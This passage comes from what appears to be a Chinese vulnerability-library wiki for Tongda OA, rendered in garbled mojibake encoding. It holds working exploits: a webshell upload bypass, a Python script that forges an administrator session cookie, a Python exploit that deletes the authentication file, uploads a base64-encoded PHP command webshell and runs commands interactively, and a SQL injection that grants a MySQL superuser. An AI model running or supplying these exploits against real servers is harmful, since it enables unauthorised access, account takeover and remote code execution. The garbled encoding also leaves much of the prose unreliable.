‰ªªÊÑèÊñá‰ª∂Âà†Èô§ ÂèÇËÄÉÊñáÁ´† ÈÄöËææOAÊºèÊ¥û‰∏Ä‰∫õÊºèÊ¥ûÁÇπ(Github) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/ÈÄöËææOA/ÈÄöËææOA v11.2 ÂêéÂè∞‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥û.html":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/ÈÄöËææOA/ÈÄöËææOA v11.2 ÂêéÂè∞‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥û.html","title":"ÈÄöËææOA v11.2 ÂêéÂè∞‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥û","keywords":"","body":"ÈÄöËææOA v11.2ÂêéÂè∞‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ÈÄöËææOA v11.2ÂêéÂè∞Â≠òÂú®Êñá‰ª∂‰∏ä‰º†ÊºèÊ¥ûÔºåÂÖÅËÆ∏ÈÄöËøáÁªïËøáÈªëÂêçÂçïÁöÑÊñπÊ≥ïÊù•‰∏ä‰º†ÊÅ∂ÊÑèÊñá‰ª∂ÔºåÂØºËá¥ÊúçÂä°Âô®Ë¢´ÊîªÂáª ÂΩ±ÂìçÁâàÊú¨ [!NOTE] ÈÄöËææOA v11.2 ÁéØÂ¢ÉÊê≠Âª∫ ÈÄöËææOA v11.2‰∏ãËΩΩÈìæÊé• ‰∏ãËΩΩÂêéÊåâÊ≠•È™§ÂÆâË£ÖÂç≥ÂèØ ÊºèÊ¥ûÂ§çÁé∞ ËØ•ÊºèÊ¥ûÂ≠òÂú®‰∫éÂêéÂè∞ÔºåÈúÄË¶ÅÈÄöËøáÁôªÂΩïÂêéÊâçËÉΩËøõË°å‰ΩøÁî® ÁôªÂΩïÂêéÁÇπÂáª ËèúÂçï -> Á≥ªÁªüÁÆ°ÁêÜ -> ÈôÑ‰ª∂ÁÆ°ÁêÜ ÁÇπÂáªÊ∑ªÂä†ÈôÑÂΩïÂ≠òÂÇ®ÁÆ°ÁêÜÊ∑ªÂä†Â¶Ç‰∏ã(Â≠òÂÇ®ÁõÆÂΩï‰∏∫ webroot ÁõÆÂΩïÔºåÈªòËÆ§‰∏∫ D:/MYOA/webroot/) ÁÇπÂáª ÁªÑÁªá -> Á≥ªÁªüÁÆ°ÁêÜÂëò -> ‰∏ä‰º†ÈôÑ‰ª∂ ÊäìÂåÖ‰ΩøÁî® windows ÁöÑÁªïËøáÊñπÊ≥ï shell.php -> shell.php. [!NOTE] 2012 ‰∏∫ÁõÆÂΩï 1717872192 ‰∏∫ÊãºÊé•ÁöÑÊñá‰ª∂Âêç ÊúÄÂêéÁöÑshellÂêçÂ≠ó‰∏∫ 1717872192.shell.php ËÆøÈóÆÊú®È©¨Êñá‰ª∂ Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/ÈÄöËææOA/ÈÄöËææOA v11.x-v11.5‰ªªÊÑèÁî®Êà∑ÁôªÂΩï.html":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/ÈÄöËææOA/ÈÄöËææOA v11.x-v11.5‰ªªÊÑèÁî®Êà∑ÁôªÂΩï.html","title":"ÈÄöËææOA v11.x-v11.5‰ªªÊÑèÁî®Êà∑ÁôªÂΩï","keywords":"","body":"ÈÄöËææOA v11.x-v11.5‰ªªÊÑèÁî®Êà∑ÁôªÂΩï ÊºèÊ¥ûÊèèËø∞ ÈÄöËææOAÊòØ‰∏ÄÂ•óÂäûÂÖ¨Á≥ªÁªü„ÄÇ2020Âπ¥04Êúà17Êó•, ÈÄöËææOAÂÆòÊñπÂú®Êõ¥Êñ∞‰∫Ü‰∏Ä‰∏™v11ÁâàÊú¨ÂÆâÂÖ®Ë°•‰∏Å, ÂÖ∂‰∏≠‰øÆÂ§ç‰∫Ü‰∏Ä‰∏™‰ªªÊÑèÁî®Êà∑‰º™ÈÄ†ÁôªÂΩïÊºèÊ¥û„ÄÇ ËØ•ÊºèÊ¥ûÁ±ªÂûã‰∏∫‰ªªÊÑèÁî®Êà∑‰º™ÈÄ†ÔºåÊú™ÁªèÊéàÊùÉÁöÑËøúÁ®ãÊîªÂáªËÄÖÂèØ‰ª•ÈÄöËøáÁ≤æÂøÉÊûÑÈÄ†ÁöÑËØ∑Ê±ÇÂåÖËøõË°å‰ªªÊÑèÁî®Êà∑‰º™ÈÄ†ÁôªÂΩï„ÄÇ ÂΩ±ÂìçÁâàÊú¨ [!NOTE] ÈÄöËææOA 2017Áâà ÈÄöËææOAÁâàÊú¨ V11.X ÁéØÂ¢ÉÊê≠Âª∫ ÊºèÊ¥ûÁéØÂ¢É‰∏ãËΩΩ https://cdndown.tongda2000.com/oa/2019/TDOA11.4.exe ÂèåÂáªÂÆâË£ÖÂç≥ÂèØ ÊºèÊ¥ûÂ§çÁé∞ ‰ΩøÁî®POCËé∑ÂèñÁÆ°ÁêÜÂëòÁöÑCookie root@kali:~/Ê°åÈù¢# python3 1.py -v 11 -u http://xx.xxx.xxx.xxx [+]Get Available COOKIE:PHPSESSID=sr3f46qg6539khd3e3rrucoa72; path=/ ÊàêÂäüËé∑ÂæóCookie,Ê∑ªÂä†CookieËÆøÈóÆ http://xxx.xxx.xxx.xxx/general/index.php?isIE=0&modify_pwd=0Âç≥ÂèØ ÊºèÊ¥ûÂà©Áî®POC ''' @Author : Sp4ce @Date : 2020-03-17 23:42:16 LastEditors : Sp4ce LastEditTime : 2020-08-27 10:21:44 @Description : Challenge Everything. ''' import requests from random import choice import argparse import json USER_AGENTS = [ \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\", \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)\", \"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\", \"Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)\", \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)\", \"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)\", \"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)\", \"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)\", \"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6\", \"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1\", \"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0\", \"Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5\", \"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11\", \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20\", \"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER\", \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)\", \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER\", \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)\", \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)\", \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)\", \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)\", \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)\", \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)\", \"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1\", \"Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5\", \"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre\", \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11\", \"Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10\" ] headers={} def getV11Session(url): checkUrl = url+'/general/login_code.php' try: headers[\"User-Agent\"] = choice(USER_AGENTS) res = requests.get(checkUrl,headers=headers) resText = str(res.text).split('{') codeUid = resText[-1].replace('}\"}', '').replace('\\r\\n', '') getSessUrl = url+'/logincheck_code.php' res = requests.post( getSessUrl, data={'CODEUID': '{'+codeUid+'}', 'UID': int(1)},headers=headers) tmp_cookie = res.headers['Set-Cookie'] headers[\"User-Agent\"] = choice(USER_AGENTS) headers[\"Cookie\"] = tmp_cookie check_available = requests.get(url + '/general/index.php',headers=headers) if 'Áî®Êà∑Êú™ÁôªÂΩï' not in check_available.text: if 'ÈáçÊñ∞ÁôªÂΩï' not in check_available.text: print('[+]Get Available COOKIE:' + tmp_cookie) else: print('[-]Something Wrong With ' + url + ',Maybe Not Vulnerable.') except: print('[-]Something Wrong With '+url) def get2017Session(url): checkUrl = url+'/ispirit/login_code.php' try: headers[\"User-Agent\"] = choice(USER_AGENTS) res = requests.get(checkUrl,headers=headers) resText = json.loads(res.text) codeUid = resText['codeuid'] codeScanUrl = url+'/general/login_code_scan.php' res = requests.post(codeScanUrl, data={'codeuid': codeUid, 'uid': int( 1), 'source': 'pc', 'type': 'confirm', 'username': 'admin'},headers=headers) resText = json.loads(res.text) status = resText['status'] if status == str(1): getCodeUidUrl = url+'/ispirit/login_code_check.php?codeuid='+codeUid res = requests.get(getCodeUidUrl) tmp_cookie = res.headers['Set-Cookie'] headers[\"User-Agent\"] = choice(USER_AGENTS) headers[\"Cookie\"] = tmp_cookie check_available = requests.get(url + '/general/index.php',headers=headers) if 'Áî®Êà∑Êú™ÁôªÂΩï' not in check_available.text: if 'ÈáçÊñ∞ÁôªÂΩï' not in check_available.text: print('[+]Get Available COOKIE:' + tmp_cookie) else: print('[-]Something Wrong With ' + url + ',Maybe Not Vulnerable.') else: print('[-]Something Wrong With '+url + ' Maybe Not Vulnerable ?') except: print('[-]Something Wrong With '+url) if __name__ == \"__main__\": parser = argparse.ArgumentParser() parser.add_argument( \"-v\", \"--tdoaversion\", type=int, choices=[11, 2017], help=\"Target TongDa OA Version. e.g: -v 11„ÄÅ-v 2017\") parser.add_argument( \"-url\", \"--targeturl\", type=str, help=\"Target URL. e.g: -url 192.168.2.1„ÄÅ-url http://192.168.2.1\" ) args = parser.parse_args() url = args.targeturl if 'http://' not in url: url = 'http://' + url if args.tdoaversion == 11: getV11Session(url) elif args.tdoaversion == 2017: get2017Session(url) else: parser.print_help() Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/ÈÄöËææOA/ÈÄöËææOA v11.6 ‰ªªÊÑèÊñá‰ª∂Âà†Èô§&RCE.html":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/ÈÄöËææOA/ÈÄöËææOA v11.6 ‰ªªÊÑèÊñá‰ª∂Âà†Èô§&RCE.html","title":"ÈÄöËææOA v11.6 ‰ªªÊÑèÊñá‰ª∂Âà†Èô§&RCE","keywords":"","body":"ÈÄöËææOA v11.6 ‰ªªÊÑèÊñá‰ª∂Âà†Èô§&RCE ÊºèÊ¥ûÊèèËø∞ ÈÄöËøá‰ªªÊÑèÊñá‰ª∂ÊºèÊ¥ûÂà†Èô§‰∏ä‰º†ÁÇπÂåÖÂê´ÁöÑË∫´‰ªΩÈ™åËØÅÊñá‰ª∂Ôºå‰ªéËÄåÈÄ†ÊàêÊú™ÊéàÊùÉËÆøÈóÆÂÆûÁé∞‰ªªÊÑèÊñá‰ª∂‰∏ä‰º† ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ÈÄöËææOA v11.6 ÁéØÂ¢ÉÊê≠Âª∫ ÈÄöËææOA v11.6‰∏ãËΩΩÈìæÊé• ‰∏ãËΩΩÂÆåÊØïÁÇπÂáªÂÆâË£ÖÂç≥ÂèØ ÊºèÊ¥ûÂ§çÁé∞ ‰ΩøÁî®Ëß£ÂØÜÂ∑•ÂÖ∑ SeayDzend(zendËß£ÂØÜÂ∑•ÂÖ∑) ÂØπÈÄöËææOAÁöÑÂä†ÂØÜ‰ª£Á†ÅËøõË°åËß£ÂØÜ [!NOTE] Ëß£ÂØÜÂ∑•ÂÖ∑Â∑≤ÁªèÊîæÂú®ÁõÆÂΩï‰∏ãÁöÑPOCÁõÆÂΩï‰∏≠ Ëß£ÂØÜÂÆåÊàêÂêéÊü•Áúã webroot\\general\\data_center\\utils\\upload.php Êñá‰ª∂ \\r\\n\\r\\n\"; ?> Âú®Á¨¨‰∏ÄË°åÂåÖÂê´‰∫ÜÊñá‰ª∂ auth.inc.php include_once \"inc/auth.inc.php\"; ÂèØ‰ª•ÁúãÂà∞Ëøô‰∏™Êñá‰ª∂Áî®‰∫éÊ£ÄÈ™åÊòØÂê¶ÁôªÂΩïÔºåÊú™ÁôªÂΩïÁöÑÊÉÖÂÜµÊó†Ê≥ïÂà©Áî®Ëøô‰∏™ÊºèÊ¥û Êü•Áúã \\webroot\\module\\appbuilder\\assets\\print.phpÊñá‰ª∂ ËøôÈáåÂèØ‰ª•ÁúãÂà∞ È°µÈù¢Ëé∑Âèñ guidÂèÇÊï∞ÁöÑÂÄº ‰ΩøÁî®file_existsÂáΩÊï∞Âà§Êñ≠Êñá‰ª∂ÊòØÂê¶Â≠òÂú® Âπ∂Êú™ËøõË°åÊ†°È™å Â∞±ÊâßË°åunlinkÂà†Èô§Êñá‰ª∂ ÂèØ‰ª•Êú¨Âú∞Âú® \\webroot\\inc ÁõÆÂΩïÂàõÂª∫ 1.txt Êñá‰ª∂ ÁÑ∂ÂêéËÆøÈóÆ http://xxx.xxx.xxx.xxx/module/appbuilder/assets/print.php?guid=../../../webroot/inc/1.txt Â∞±‰ºöÂà†Èô§Ëøô‰∏™ 1.txt Êñá‰ª∂Ôºå‰πü‰ª£Ë°®ÂèØ‰ª•Âà†Èô§ auth.inc.php ÁôªÂΩïÊ£ÄÈ™åÊñá‰ª∂ ÂõûÂà∞ upload.php Êñá‰ª∂ËøõË°å‰ª£Á†ÅÂÆ°ËÆ° Âà§Êñ≠ÂèòÈáè $action ÊòØÂê¶‰∏∫ uploadÔºåÂÜçÂà§Êñ≠Êñá‰ª∂Á±ªÂûãÔºåÂ¶ÇÊûú‰∏ç‰∏∫ xls Âíå img ÂàôËøõÂÖ•elseÂàÜÊîØ else { $uploaddir = MYOA_ATTACH_PATH . \"/data_center/attachment/\"; if (!is_dir(MYOA_ATTACH_PATH . \"/data_center/attachment\")) { if (!is_dir(MYOA_ATTACH_PATH . \"/data_center\")) { mkdir(MYOA_ATTACH_PATH . \"/data_center\"); } mkdir(MYOA_ATTACH_PATH . \"/data_center/attachment\"); } if (isset($from_rep)) { if (($from_rep != \"\") && ($from_rep[0] == \"{\")) { $repkid = GetRepKIDBySendId($from_rep); if ($repkid != $to_rep) { if (file_exists($uploaddir . \"/\" . $repkid . \"_\" . $filename)) { copy($uploaddir . \"/\" . $repkid . \"_\" . $filename, $uploaddir . \"/\" . $to_rep . \"_\" . $filename); } } } else { $arr = explode(\",\", $from_rep); for ($i = 0; $i Âú®ËøôÊÆµ‰ª£Á†Å‰∏≠ÔºåÂ¶ÇÊûú‰∏çÂ≠òÂú® $from_rep ÂèòÈáèÂàô‰ºöË∑≥Âà∞Â¶Ç‰∏ã‰ª£Á†Å else { $s_n = $_FILES[\"FILE1\"][\"name\"]; if ($s_n[0] != \"{\") { $s_n = $repkid . \"_\" . $s_n; } if (move_uploaded_file($_FILES[\"FILE1\"][\"tmp_name\"], $uploaddir . $s_n)) { } } ËøôÈáåÁõ¥Êé•Â∞Ü $repkid ÂèòÈáèËøõË°åÊãºÊé•,‰πüÂ∞±ÊòØËØ¥ÂèØ‰ª•ÈÄöËøáÁõÆÂΩïÁ©øË∂äÊù•‰∏ä‰º†ÊÅ∂ÊÑèÊñá‰ª∂Âà∞ÊåáÂÆöÁõÆÂΩï [!NOTE] ËøôÈáåÈúÄË¶ÅÂà©Áî®file_existsÂáΩÊï∞ÁöÑÊºèÊ¥ûÊûÑÈÄ†/.<>./.<>./.<>./ ÈÄÉÈÄ∏Âá∫Êù• ‰ΩøÁî®POCÊù•Âà©Áî®ÊºèÊ¥û [!NOTE] Ê≥®ÊÑèÂú®Âà†Èô§È™åËØÅË∫´‰ªΩÁöÑÊñá‰ª∂ÂêéÔºå‰ºöÈÄ†ÊàêÂêéÂè∞È°µÈù¢Âá∫Áé∞Â¶Ç‰∏ãÂõæÔºå‰ΩøÁî®ÂâçÂ§á‰ªΩÊñá‰ª∂ ÊºèÊ¥ûÂà©Áî®POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import re import base64 import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: ÈÄöËææOA v11.6 ‰ªªÊÑèÊñá‰ª∂Âà†Èô§&RCE \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mCmd >>> whoami \\033[0m') print('+------------------------------------------') def POC_1(target_url): check_url = target_url + \"/module/appbuilder/assets/print.php\" try: check_url_response = requests.get(url = check_url) if check_url_response.status_code == 200: print(\"\\033[32m[o] Â≠òÂú® /module/appbuilder/assets/print.php ÂèØËÉΩÂê´ÊúâÈÄöËææOA v11.6 ‰ªªÊÑèÊñá‰ª∂Âà†Èô§&RCEÊºèÊ¥û\\033[0m\") input(\"\\033[32m[o] Ê≠§ÊºèÊ¥û‰ºöÂØπÁúüÂÆûÁéØÂ¢ÉÈÄ†ÊàêÂΩ±ÂìçÔºåËØ∑Âú®ÊéàÊùÉÁöÑÊÉÖÂÜµ‰∏ãÂà©Áî®Ê≠§ÊºèÊ¥ûÔºåÊåâ‰∏ã‰ªªÊÑèÈîÆÁªßÁª≠..... \\033[0m\") else: print(\"\\033[31m[x] ‰∏çÂ≠òÂú® /module/appbuilder/assets/print.php ÊºèÊ¥ûÂà©Áî®Â§±Ë¥• \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥•Ôºå{} \\033[0m\".format(e)) sys.exit(0) def POC_2(target_url): unlink_url = target_url + \"/module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php\" try: unlink_response = requests.get(url = unlink_url) if unlink_response.status_code == 200: print(\"\\033[32m[o] ÊàêÂäüÂà†Èô§Ê†°È™åÊñá‰ª∂ auth.inc.php \\033[0m\") else: print(\"\\033[31m[x] Âà†Èô§Ê†°È™åÊñá‰ª∂ auth.inc.php Â§±Ë¥• \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥•Ôºå{} \\033[0m\".format(e)) sys.exit(0) def POC_3(target_url, payload_php): \"\"\" (ÁªïËøáÁöÑwebshell) exec(\"cmd /c \".$command); $stdout = $exec->StdOut(); $stroutput = $stdout->ReadAll(); echo $stroutput; ?> \"\"\" vuln_url = target_url + \"/general/data_center/utils/upload.php?action=upload&filetype=test&repkid=/.<>./.<>./.<>./\" files = {'FILE1': ('test.php', payload_php)} try: vuln_response = requests.post(url = vuln_url,files=files) if vuln_response.status_code == 200: print(\"\\033[32m[o] ÊàêÂäüÂÜôÂÖ•webshellÊñá‰ª∂: _test.php \\033[0m\") print(\"\\033[32m[o] webshellÂú∞ÂùÄ‰∏∫: {}/_test.php \\033[0m\".format(target_url)) else: print(\"\\033[31m[x] ÂÜôÂÖ•webshellÊñá‰ª∂Â§±Ë¥• \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥•Ôºå{} \\033[0m\".format(e)) sys.exit(0) def POC_4(target_url, cmd): cmd_url = target_url + \"/_test.php?test={}\".format(cmd) try: cmd_response = requests.get(url = cmd_url) if cmd_response.status_code == 200: print(\"\\033[32m[o] Ê≠£Âú®ÊâßË°åÂëΩ‰ª§: {} \\033[0m\".format(cmd_url)) print(\"\\033[32m[o] ÂìçÂ∫î‰∏∫: \\n{} \\033[0m\".format(cmd_response.text)) else: print(\"\\033[31m[x] ÂëΩ‰ª§ÊâßË°åÂ§±Ë¥• \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥•Ôºå{} \\033[0m\".format(e)) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) POC_2(target_url) payload_php = base64.b64decode(\"PD9waHAKICAgICRjb21tYW5kPSRfR0VUWyd0ZXN0J107CiAgICAkd3NoID0gbmV3IENPTSgnV1NjcmlwdC5zaGVsbCcpOwogICAgJGV4ZWMgPSAkd3NoLT5leGVjKCJjbWQgL2MgIi4kY29tbWFuZCk7CiAgICAkc3Rkb3V0ID0gJGV4ZWMtPlN0ZE91dCgpOwogICAgJHN0cm91dHB1dCA9ICRzdGRvdXQtPlJlYWRBbGwoKTsKICAgIGVjaG8gJHN0cm91dHB1dDsKPz4=\").decode(\"utf-8\") POC_3(target_url, payload_php) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": sys.exit(0) else: POC_4(target_url, cmd) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/ÈÄöËææOA/ÈÄöËææOA v11.7 ÂêéÂè∞SQLÊ≥®ÂÖ•.html":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/ÈÄöËææOA/ÈÄöËææOA v11.7 ÂêéÂè∞SQLÊ≥®ÂÖ•.html","title":"ÈÄöËææOA v11.7 ÂêéÂè∞SQLÊ≥®ÂÖ•","keywords":"","body":"ÈÄöËææOA v11.7ÂêéÂè∞SQLÊ≥®ÂÖ• ÊºèÊ¥ûÊèèËø∞ ÈÄöËææOA v11.7ÂêéÂè∞Â≠òÂú®SQLÊ≥®ÂÖ•ÔºåÂèØÈÄöËøáÊ≠§ÊºèÊ¥ûÂÜôÂÖ•ÊÅ∂ÊÑèÂêéÈó®Êñá‰ª∂ÊîªÂáªÁõÆÊ†áÊúçÂä°Âô® ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ÈÄöËææOA v11.7 ÁéØÂ¢ÉÊê≠Âª∫ ÁéØÂ¢ÉÂú∞ÂùÄ ÊºèÊ¥ûÂ§çÁé∞ Âú® general/hr/manage/query/delete_cascade.php Êñá‰ª∂‰∏≠ È¶ñÂÖàÂà§Êñ≠$condition_cascadeÊòØÂê¶‰∏∫Á©∫ÔºåÂ¶ÇÊûú‰∏ç‰∏∫Á©∫ÔºåÂàôÂ∞ÜÂÖ∂‰∏≠ÁöÑ\\'ÊõøÊç¢‰∏∫'„ÄÇ‰∏∫‰ªÄ‰πàË¶ÅËøôÊ†∑ÊõøÊç¢Âë¢Ôºå‰∏ªË¶ÅÊòØÂõ†‰∏∫V11.7ÁâàÊú¨‰∏≠ÔºåÊ≥®ÂÜåÂèòÈáèÊó∂ËÄÉËôë‰∫ÜÂÆâÂÖ®ÈóÆÈ¢òÔºåÂ∞ÜÁî®Êà∑ËæìÂÖ•ÁöÑÂ≠óÁ¨¶Áî®addslashesÂáΩÊï∞ËøõË°å‰øùÊä§ÔºåÂ¶Ç‰∏ãÔºö inc/common.inc.php ‰ª£Á†Å ‰ΩøÁî®Áõ≤Ê≥®ÂØπSQLÊ≥®ÂÖ•ËøõË°åÊµãËØï Ëß¶Âèë‰∫ÜÈÄöËææOAÁöÑSQLÊ≥®ÂÖ•Êã¶Êà™ inc/conn.phpÊñá‰ª∂‰∏≠ÊâæÂà∞ËøáÊª§Êú∫Âà∂Â¶Ç‰∏ã: ÂÖ∂ËøáÊª§‰∫Ü‰∏Ä‰∫õÂ≠óÁ¨¶Ôºå‰ΩÜÊòØÂπ∂ÈùûÊó†Ê≥ïÁªïËøáÔºåÁõ≤Ê≥®ÁöÑÊ†∏ÂøÉÊòØÔºösubstr„ÄÅifÁ≠âÂáΩÊï∞ÔºåÂùáÊú™Ë¢´ËøáÊª§ÔºåÈÇ£‰πàÂè™Ë¶ÅÊûÑÈÄ†MySQLÊä•ÈîôÂç≥ÂèØÈÖçÂêàifÂáΩÊï∞ËøõË°åÁõ≤Ê≥®‰∫ÜÔºåÁøªÁúãÂ±ÄÂ§ñ‰∫∫Â∏àÂÇÖÂú®Ë°•Â§©ÁôΩÂ∏ΩÂ§ß‰ºö‰∏äÁöÑÂàÜ‰∫´ÔºåÂèëÁé∞power(9999,99)‰πüÂèØ‰ª•‰ΩøÊï∞ÊçÆÂ∫ìÊä•ÈîôÔºåÊâÄ‰ª•ÊûÑÈÄ†ËØ≠Âè•Ôºö select if((substr(user(),1,1)='r'),1,power(9999,99)) # ÂΩìÂ≠óÁ¨¶Áõ∏Á≠âÊó∂Ôºå‰∏çÊä•ÈîôÔºåÈîôËØØÊó∂Êä•Èîô Ê∑ªÂä†SQLÊï∞ÊçÆÂ∫ìÁî®Êà∑ grant all privileges ON mysql.* TO 'peiqi'@'%' IDENTIFIED BY 'peiqiABC@123' WITH GRANT OPTION ËÆøÈóÆ http://xxx.xxx.xxx.xxx/general/hr/manage/query/delete_cascade.php?condition_cascade=grant all privileges ON mysql.* TO 'peiqi'@'%' IDENTIFIED BY 'peiqiABC@123' WITH GRANT OPTION ËøõÂÖ• Myoa/mysql5/bin ÁõÆÂΩï ÊâßË°å mysql -upeiqi -p 